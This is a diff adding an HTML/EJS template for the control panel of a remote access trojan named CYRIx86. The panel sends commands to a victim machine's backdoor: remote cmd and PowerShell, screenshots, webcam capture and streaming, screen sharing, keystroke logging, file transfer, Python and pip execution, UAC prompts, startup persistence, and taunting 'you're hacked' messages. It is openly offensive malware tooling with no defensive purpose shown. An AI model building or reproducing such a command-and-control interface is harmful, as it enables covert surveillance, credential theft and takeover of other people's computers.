@@ -1,0 +1,391 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title><%- id %> | PANEL - CYRIx86</title>
+    <link rel="stylesheet" href="/assets/css/main.css">
+    <link rel="stylesheet" href="/assets/css/panel.css">
+
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/socket.io/4.7.2/socket.io.js"
+        integrity="sha512-zoJXRvW2gC8Z0Xo3lBbao5+AS3g6YWr5ztKqaicua11xHo+AvE1b0lT9ODgrHTmNUxeCw0Ry4BGRYZfXu70weg=="
+        crossorigin="anonymous" referrerpolicy="no-referrer"></script>
+    <script src="https://cdn.jsdelivr.net/npm/axios/dist/axios.min.js"></script>
+    <script src="/assets/js/main.js"></script>
+    <script>
+        const ID = `<%- id %>`
+    </script>
+    <script src="/assets/js/panel-b.js" defer></script>
+</head>
+
+<body>
+    <video id="video-background" autoplay muted loop>
+        <source src="/assets/src/bg.mp4" type="video/mp4">
+        Your browser does not support the video tag.
+    </video>
+
+    <div class="panel-container">
+        <div class="panel-bar">
+            <h2 class="tool-title">
+                <p>CYRI<span>x</span>86</p>
+                <small>-by madhanmaaz</small>
+            </h2>
+
+            <button data-value="cmd" class="active">
+                <img src="./assets/src/command-prompt-48.png" alt="">
+                <span>command prompt</span>
+            </button>
+            <button data-value="powershell">
+                <img src="./assets/src/powershell-48.png" alt="">
+                <span>powershell</span>
+            </button>
+            <button data-value="screenshot">
+                <img src="./assets/src/screenshot-48.png" alt="">
+                <span>screenshot</span>
+            </button>
+            <button data-value="webcam-snapshot">
+                <img src="./assets/src/camera-48.png" alt="">
+                <span>webcam snapshot</span>
+            </button>
+            <button data-value="screenshare">
+                <img src="./assets/src/stream-48.png" alt="">
+                <span>screen share</span>
+            </button>
+            <button data-value="webcamstream">
+                <img src="./assets/src/stream-48.png" alt="">
+                <span>webcam stream</span>
+            </button>
+            <button data-value="playaudio">
+                <img src="/assets/src/audio-48.png" alt="">
+                <span>play audio</span>
+            </button>
+            <button data-value="keystrokes">
+                <img src="/assets/src/keyboard-48.png" alt="">
+                <span>keystrokes</span>
+            </button>
+            <button data-value="upload">
+                <img src="./assets/src/upload-48.png" alt="">
+                <span>upload file</span>
+            </button>
+            <button data-value="download">
+                <img src="./assets/src/download-48.png" alt="">
+                <span>download file</span>
+            </button>
+            <button data-value="notifications">
+                <img src="./assets/src/notification-48.png" alt="">
+                <span>notifications</span>
+            </button>
+            <button data-value="messagebox">
+                <img src="./assets/src/discussion-forum-48.png" alt="">
+                <span>message box</span>
+            </button>
+            <button data-value="uac">
+                <img src="./assets/src/uac.png" alt="">
+                <span>uac</span>
+            </button>
+            <button data-value="python">
+                <img src="./assets/src/python-48.png" alt="">
+                <span>run python</span>
+            </button>
+            <button data-value="pip">
+                <img src="./assets/src/pip.png" alt="">
+                <span>pip</span>
+            </button>
+            <button data-value="startup">
+                <img src="./assets/src/startup.png" alt="">
+                <span>startup</span>
+            </button>
+            <button data-value="exit">
+                <img src="./assets/src/exit.png" alt="">
+                <span>exit</span>
+            </button>
+            <a href="/fm?id=<%- id %>" target="_blank" rel="noopener noreferrer">
+                <button>
+                    <img src="./assets/src/folder-48.png" alt="">
+                    <span>filemanager</span>
+                </button>
+            </a>
+        </div>
+
+        <div class="panel-content">
+            <div class="panel-header">
+                <h3 class="panel-title">cmd</h3>
+
+                <div class="right">
+                    <span>
+                        STATUS
+                        <% if (online){ %>
+                            <sup id="ping-status" class="active"></sup>
+                            <%} else { %>
+                                <sup id="ping-status"></sup>
+                                <% } %>
+                    </span>
+
+                    <button id="panel-bar-open"><i class="fa-solid fa-bars"></i></button>
+                </div>
+            </div>
+
+            <div class="panels">
+                <form class="data-form cmd-panel active">
+                    <input type="hidden" name="command" value="cmd">
+                    <div>
+                        <span>[CMD]-&lt;<%- locationPath %>>-> </span>
+                        <input type="text" name="value" autocomplete="off" spellcheck="false" required id="text-inp">
+                    </div>
+                </form>
+
+                <form class="data-form powershell-panel">
+                    <input type="hidden" name="command" value="powershell">
+                    <div>
+                        <span>[PS]-&lt;<%- locationPath %>>-> </span>
+                        <input type="text" name="value" autocomplete="off" spellcheck="false" required id="text-inp">
+                    </div>
+                </form>
+
+                <form class="data-form screenshot-panel">
+                    <input type="hidden" name="command" value="screenshot">
+
+                    <div class="box-inp">
+                        <label>screenshot</label>
+                        <select name="screen">
+                            <option value="1">1</option>
+                            <option value="all">all screen</option>
+                        </select>
+                    </div>
+                    <button class="b-btn" type="submit">screenshot</button>
+                </form>
+
+                <form class="data-form webcam-snapshot-panel">
+                    <input type="hidden" name="command" value="webcam-snapshot">
+                    <div class="box-inp">
+                        <label>webcam</label>
+                        <input type="number" placeholder="1" value="1" name="value" required>
+                    </div>
+
+                    <button class="b-btn" type="submit">take snapshot</button>
+                </form>
+
+                <form class="data-form screenshare-panel">
+                    <input type="hidden" name="command" value="screenshare">
+                    <div class="box-inp">
+                        <label>monitor</label>
+                        <input type="number" placeholder="1" value="1" name="monitor" required>
+                    </div>
+
+                    <div class="box-inp">
+                        <select name="value">
+                            <option value="start">start</option>
+                            <option value="stop">stop</option>
+                        </select>
+                    </div>
+                    <button class="b-btn" type="submit">execute</button>
+                </form>
+
+                <form class="data-form webcamstream-panel">
+                    <input type="hidden" name="command" value="webcamstream">
+                    <div class="box-inp">
+                        <label>webcam</label>
+                        <input type="number" placeholder="1" value="1" name="webcam" required>
+                    </div>
+
+                    <div class="box-inp">
+                        <select name="value">
+                            <option value="start">start</option>
+                            <option value="stop">stop</option>
+                        </select>
+                    </div>
+                    <button class="b-btn" type="submit">execute</button>
+                </form>
+
+                <form class="data-form playaudio-panel">
+                    <input type="hidden" name="command" value="playaudio">
+
+                    <div class="box-inp">
+                        <label>filename</label>
+                        <input type="text" placeholder="D:\audio.mp3" name="filename" id="text-inp">
+                    </div>
+
+                    <div class="box-inp">
+                        <select name="value">
+                            <option value="start">start</option>
+                            <option value="stop">stop</option>
+                        </select>
+                    </div>
+                    <button class="b-btn" type="submit">execute</button>
+                </form>
+
+                <form class="data-form keystrokes-panel">
+                    <input type="hidden" name="command" value="keystrokes">
+
+                    <div class="box-inp">
+                        <select name="value">
+                            <option value="start">start</option>
+                            <option value="stop">stop</option>
+                        </select>
+                    </div>
+                    <button class="b-btn" type="submit">execute</button>
+                </form>
+
+                <form class="data-form upload-panel">
+                    <input type="hidden" name="command" value="upload">
+
+                    <div class="box-inp">
+                        <label>url</label>
+                        <input type="url" name="url" placeholder="http://files.com/wallpaper.jpg" required
+                            id="text-inp">
+                    </div>
+                    <div class="box-inp">
+                        <label>filename</label>
+                        <input type="text" name="filename" placeholder="d:\wallpaper.jpg" required id="text-inp">
+                    </div>
+                    <button class="b-btn" type="submit">upload</button>
+                </form>
+
+                <form class="data-form download-panel">
+                    <input type="hidden" name="command" value="download">
+
+                    <div class="box-inp">
+                        <label>filename</label>
+                        <input type="text" name="filename" placeholder="D:\wallpaper.jpg" required id="text-inp">
+                    </div>
+                    <button class="b-btn" type="submit">download</button>
+                </form>
+
+                <form class="data-form notifications-panel">
+                    <input type="hidden" name="command" value="notifications">
+
+                    <div class="box-inp">
+                        <label>icon</label>
+                        <select name="icon">
+                            <option value="None">None</option>
+                            <option value="Info" selected>Info</option>
+                            <option value="Warning">Warning</option>
+                            <option value="Error">Error</option>
+                        </select>
+                    </div>
+                    <div class="box-inp">
+                        <label>title</label>
+                        <input type="text" name="title" placeholder="message from hacker" required id="text-inp">
+                    </div>
+                    <div class="box-inp">
+                        <label>description</label>
+                        <input type="text" name="content" placeholder="you're hacked by madhanmaaz" required
+                            id="text-inp">
+                    </div>
+                    <button class="b-btn" type="submit">send</button>
+                </form>
+
+                <form class="data-form messagebox-panel">
+                    <input type="hidden" name="command" value="messagebox">
+
+                    <div class="box-inp">
+                        <label>icon</label>
+                        <select name="icon">
+                            <option value="0">None</option>
+                            <option value="64" selected>information</option>
+                            <option value="48">exclamation</option>
+                            <option value="32">question</option>
+                            <option value="16">critical</option>
+                        </select>
+                    </div>
+                    <div class="box-inp">
+                        <label>button</label>
+                        <select name="buttons">
+                            <option value="0">ok only</option>
+                            <option value="1" selected>ok | cancel</option>
+                            <option value="2">abort | retry | ignore</option>
+                            <option value="3">yes | no | cancel</option>
+                            <option value="4">yes | no</option>
+                            <option value="5">retry | cancel</option>
+                        </select>
+                    </div>
+                    <div class="box-inp">
+                        <label>title</label>
+                        <input type="text" name="content" placeholder="message from hacker" required id="text-inp">
+                    </div>
+                    <div class="box-inp">
+                        <label>description</label>
+                        <input type="text" name="title" placeholder="you're hacked by madhanmaaz" required
+                            id="text-inp">
+                    </div>
+                    <button class="b-btn" type="submit">execute</button>
+                </form>
+
+                <form class="data-form uac-panel">
+                    <input type="hidden" name="command" value="uac">
+                    <div class="box-inp" style="width: auto;">
+                        <label>confirm</label>
+                        <input type="checkbox" required style="width: 30px;height: 30px;">
+                    </div>
+                    <button class="b-btn" type="submit">request UAC</button>
+                </form>
+
+                <form class="data-form python-panel">
+                    <input type="hidden" name="command" value="python">
+                    <textarea spellcheck="false" class="python-textarea" type="text" name="value"
+                        placeholder="python code..." required></textarea>
+                    <button class="b-btn" type="submit">run</button>
+                </form>
+
+                <form class="data-form pip-panel">
+                    <input type="hidden" name="command" value="pip">
+
+                    <div class="box-inp">
+                        <label>pip application</label>
+                        <input type="text" name="value" placeholder="install scipy" required id="text-inp">
+                    </div>
+                    <button class="b-btn" type="submit">install</button>
+                </form>
+
+                <form class="data-form startup-panel">
+                    <input type="hidden" name="command" value="startup">
+
+                    <p>This will set the payload on system startup. remember use static origin.</p>
+                    <div class="box-inp">
+                        <label>startup name</label>
+                        <input type="text" name="value" placeholder="system" required id="text-inp">
+                    </div>
+                    <button class="b-btn" type="submit">install startup</button>
+                </form>
+
+                <form class="data-form exit-panel">
+                    <input type="hidden" name="command" value="exit">
+
+                    <p>This will quit the backdoor.</p>
+                    <div class="box-inp" style="width: auto;">
+                        <label>confirm</label>
+                        <input type="checkbox" required style="width: 30px;height: 30px;">
+                    </div>
+                    <input class="b-btn" type="submit" value="exit payload">
+                </form>
+            </div>
+
+            <div class="logs cmd-panel-log active"></div>
+            <div class="logs powershell-panel-log"></div>
+            <div class="logs screenshot-panel-log"></div>
+            <div class="logs webcam-snapshot-panel-log"></div>
+            <div class="logs screenshare-panel-log">
+                <h4 class="streamer-status">FRAME: 0</h4>
+                <img>
+            </div>
+            <div class="logs webcamstream-panel-log">
+                <h4 class="streamer-status">FRAME: 0</h4>
+                <img>
+            </div>
+            <div class="logs playaudio-panel-log"></div>
+            <div class="logs keystrokes-panel-log"></div>
+            <div class="logs upload-panel-log"></div>
+            <div class="logs download-panel-log"></div>
+            <div class="logs notifications-panel-log"></div>
+            <div class="logs messagebox-panel-log"></div>
+            <div class="logs uac-panel-log"></div>
+            <div class="logs python-panel-log"></div>
+            <div class="logs pip-panel-log"></div>
+            <div class="logs startup-panel-log"></div>
+            <div class="logs exit-panel-log"></div>
+        </div>
+    </div>
+</body>
+
+</html>
